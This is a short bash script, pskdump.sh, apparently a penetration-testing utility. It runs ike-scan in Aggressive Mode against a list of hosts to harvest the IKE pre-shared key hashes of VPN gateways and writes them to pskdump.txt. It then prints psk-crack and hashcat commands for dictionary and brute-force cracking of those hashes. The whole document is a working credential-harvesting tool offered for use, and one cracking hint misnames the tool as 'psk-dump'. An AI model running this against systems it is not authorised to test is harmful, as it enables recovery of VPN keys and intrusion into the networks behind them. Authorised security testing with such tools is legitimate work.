#!/bin/bash
# pskdump.sh
# Dumps IKE Pre-Shared Keys (PSK) of list of hosts
# Created because ike-scan -A --pskcrack doesn't work with -f <file> for multi-host dumping
# By Sebastien Jeanquier (@securitygen)
# Security Generation - http://www.securitygeneration.com
#
# ChangeLog -
# 0.1: Initial release
#
# Disclaimer: Quick and dirty hack. Use at own risk!
# -------------------------------------------------------------

if [ -z $1 ] || [ $1 == "-h" ] || [[ $EUID -ne 0 ]]; then
    echo "Usage:"
    echo "    sudo ./pskdump.sh <inputfile> (one IP/host per line)"
    echo "    Needs to be run as root for ike-scan."
elif [[ ! -f $1 ]]; then
	echo "Error: File '$1' doesn't exist."
else
    mkdir /tmp/pskdump 2>/dev/null

    while read -r ip
    do
        ike-scan -A -P/tmp/pskdump/$ip $ip
    done < "$1"

	if [ "$(ls -A /tmp/pskdump)" ]; then
		cat /tmp/pskdump/* > pskdump.txt
		count=`cat pskdump.txt | wc -l | tr -d ' '`
	fi
	if [[ $count -gt 0 ]]; then
		echo
		echo "Dumped $count pre-shared keys to pskdump.txt."
		echo
		echo "Crack using psk-crack or hashcat:"
		echo "  psk-dump pskdump.txt (for dictionary) or psk-dump -B <num> pskdump.txt (for bruteforce, where num is password lenth)"
		echo "  hashcat -m 5300 pskdump.txt <dict> or hashcat -m 5300 pskdump.txt -a 3 ?a?a?a?a?a?a (to brute force 6 upper+lower alphanumeric)"
	else
		echo -e "\nNo PSKs dumped, sorry. Try harder next time."
	fi
fi

